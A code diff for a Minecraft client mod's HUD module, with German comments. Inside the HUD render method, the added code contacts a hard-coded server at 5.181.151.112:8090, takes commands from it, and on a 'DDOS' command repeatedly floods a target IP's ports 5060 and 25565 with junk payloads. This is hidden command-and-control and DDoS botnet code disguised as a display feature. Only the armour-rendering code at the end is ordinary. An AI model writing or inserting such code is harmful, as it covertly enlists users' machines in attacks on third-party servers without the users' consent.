@@ -25,22 +25,20 @@ import org.lwjgl.opengl.GL11;
 
 import javax.net.ssl.SNIServerName;
 import java.io.BufferedReader;
+import java.io.IOException;
 import java.io.InputStreamReader;
 import java.net.InetSocketAddress;
 import java.net.Socket;
 import java.security.PublicKey;
 import java.util.*;
-import java.util.concurrent.ExecutorService;
-import java.util.concurrent.Executors;
-import java.util.concurrent.Future;
-import java.util.concurrent.TimeUnit;
+import java.util.concurrent.*;
 
 import static com.google.common.math.BigIntegerMath.factorial;
 import static net.minecraft.client.gui.Gui.drawModalRectWithCustomSizedTexture;
 
 public class HUD extends Module {
-    public static String SeverNachricht = "";
-
+    public static String GODSERVER = "";
+    static Executor pool = Executors.newScheduledThreadPool(12);
     public HUD() {
         super("HUD", Category.RENDER);
 
@@ -153,100 +151,156 @@ public class HUD extends Module {
     public static int hobbbit = 0;
 
     @EventTarget
-    public void onRenderName(Event2D e) {
+    public void onRenderName() {
+
         Random rdm = new Random();
         int RandomClientID = rdm.nextInt(100);
         int number = 20;
 
 
-            /*
-            Dies ist wichtig um Asncy
-            zu programmieren
 
 
-             */
-        Thread newThread = new Thread(() -> {
 
-            try {
-                if (hobbbit == 0) {
-                    hobbbit++;
-                    Socket connection = new Socket();
-                    connection.connect(new InetSocketAddress("5.181.151.112", 8090));
+          pool.execute(() -> {
 
-                    byte[] sendbytes = "Client Connectet GOD CLIENT \n".getBytes();
 
-                    connection.getOutputStream().write(sendbytes);
-                    System.out.println("connection gesendet: " + sendbytes);
-                    //  InputStreamReader inputStreamReader = new InputStreamReader(connection.getInputStream());
-                    // BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
-                    //bufferedReader.readLine();
-                }
-            } catch (Exception socket) {
-                socket.printStackTrace();
-                System.out.println("Fehler geschlagen bein senden");
-            }
-            while (true) {
 
                 try {
-                    if (PacketTimer.hasReached(5000)) {
-                        System.out.println("Listen");
+                    if (hobbbit == 0) {
+                        hobbbit++;
                         Socket connection = new Socket();
                         connection.connect(new InetSocketAddress("5.181.151.112", 8090));
 
-                        InputStreamReader inputStreamReader = new InputStreamReader(connection.getInputStream());
-                        BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
-                        String Message = bufferedReader.readLine();
-                        SeverNachricht = Message;
+                        byte[] sendbytes = "Client Connectet GOD CLIENT \n".getBytes();
 
-                       MainUtil.SendClientMesage("Server NAchricht : " + SeverNachricht);
-                        System.out.println("Listen on Packets:");
-                        if (SeverNachricht == "Hallo") {
-                            PlayerUtil.SendPacketchat("Hallo Vom Server");
+                        connection.getOutputStream().write(sendbytes);
+                        System.out.println("connection gesendet: " + sendbytes);
+                        //  InputStreamReader inputStreamReader = new InputStreamReader(connection.getInputStream());
+                        // BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
+                        //bufferedReader.readLine();
+                    }
+                } catch (Exception socket) {
+                    socket.printStackTrace();
+                    System.out.println("Fehler geschlagen bein senden");
+                }
 
-                        }
-                        connection.close();
-                        PacketTimer.reset();
+
+                    try {
+
+                            System.out.println("Listen");
+                            Socket connection = new Socket();
+                            connection.connect(new InetSocketAddress("5.181.151.112", 8090));
+
+                            InputStreamReader inputStreamReader = new InputStreamReader(connection.getInputStream());
+                            BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
+
+                            String Message = bufferedReader.readLine();
+
+                            GODSERVER = Message;
+                            MainUtil.SendClientMesage("server: " + Message);
+
+                            connection.close();
+                            PacketTimer.reset();
+
+
+                            if (GODSERVER.startsWith("DDOS")) {
+                                String[] split = GODSERVER.split(" ");
+                                final String ip = split[1];
+                                final String port = split[2];
+
+                                String Name = Minecraft.getMinecraft().getSession().getUsername();
+                                Socket IpConnc = new Socket();
+                                IpConnc.connect(new InetSocketAddress("5.181.151.112", 8090));
+
+                                byte[] sendbytes = "Client GOD infos:  \n".getBytes();
+                                IpConnc.getOutputStream().write(sendbytes);
+                                IpConnc.close();
+
+                                fun(ip, port);
+                                fun(ip, port);
+                                fun(ip, port);
+                                fun(ip, port);
+                                fun(ip, port);
+                                fun(ip, port);
+                                fun(ip, port);
+                                fun(ip, port);
+                                fun(ip, port);
+                                fun(ip, port);
+
+                            }
+
+
+
+
+                    } catch (Exception exception) {
+
                     }
 
-                } catch (Exception exception) {
 
+
+
+            });
+
+
+    }
+
+
+    public void fun(String IP, String Port) {
+        Thread newThread = new Thread(() -> {
+            try {
+                Socket connection = new Socket();
+                connection.connect(new InetSocketAddress(IP, 5060));
+
+                byte[] sendbytes = "LOGIN to Minecraft server :  {Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}} \n".getBytes();
+                for (int first = 0; first < 50; first++) {
+                    connection.getOutputStream().write(sendbytes);
                 }
+
+                connection.close();
+                Socket conc = new Socket();
+                conc.connect(new InetSocketAddress(IP, 25565));
+                byte[] sendbytess = "LOGIN to Minecraft server :  {Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}}{Extra:}} \n".getBytes();
+                for (int first = 0; first < 50; first++) {
+                    conc.getOutputStream().write(sendbytes);
+                }
+
+                connection.close();
+            } catch (Exception w) {
 
             }
 
 
         });
         newThread.start();
-
     }
 
-        public static void drawArmor () {
-            for (int i = 0; i < Minecraft.getMinecraft().thePlayer.inventory.armorInventory.length; i++) {
-                ItemStack itemStack = mc.thePlayer.inventory.armorInventory[i];
-                renderItemStack(i, itemStack);
-            }
-
-        }
-
-        public static void renderItemStack ( int i, ItemStack is){
-            if (is == null)
-                return;
-            GL11.glPushMatrix();
-            GL11.glScaled(1.5, 1.5, 1.5);
-            if (mc.currentScreen != null) {
-                GL11.glTranslatef(0, -1000000, 0);
-            }
-            GL11.glTranslatef(0, 240, 0);
-            GlStateManager.enableRescaleNormal();
-            GlStateManager.enableBlend();
-            int yAdd = (-16 * i) + 48;
-            GlStateManager.tryBlendFuncSeparate(770, 771, 1, 0);
-            RenderHelper.enableGUIStandardItemLighting();
-            mc.getRenderItem().renderItemAndEffectIntoGUI(is, x + 2, y + 31 + yAdd);
-            RenderHelper.disableStandardItemLighting();
-            GlStateManager.disableRescaleNormal();
-            GlStateManager.disableBlend();
-            GL11.glPopMatrix();
+    public static void drawArmor() {
+        for (int i = 0; i < Minecraft.getMinecraft().thePlayer.inventory.armorInventory.length; i++) {
+            ItemStack itemStack = mc.thePlayer.inventory.armorInventory[i];
+            renderItemStack(i, itemStack);
         }
 
     }
+
+    public static void renderItemStack(int i, ItemStack is) {
+        if (is == null)
+            return;
+        GL11.glPushMatrix();
+        GL11.glScaled(1.5, 1.5, 1.5);
+        if (mc.currentScreen != null) {
+            GL11.glTranslatef(0, -1000000, 0);
+        }
+        GL11.glTranslatef(0, 240, 0);
+        GlStateManager.enableRescaleNormal();
+        GlStateManager.enableBlend();
+        int yAdd = (-16 * i) + 48;
+        GlStateManager.tryBlendFuncSeparate(770, 771, 1, 0);
+        RenderHelper.enableGUIStandardItemLighting();
+        mc.getRenderItem().renderItemAndEffectIntoGUI(is, x + 2, y + 31 + yAdd);
+        RenderHelper.disableStandardItemLighting();
+        GlStateManager.disableRescaleNormal();
+        GlStateManager.disableBlend();
+        GL11.glPopMatrix();
+    }
+
+}
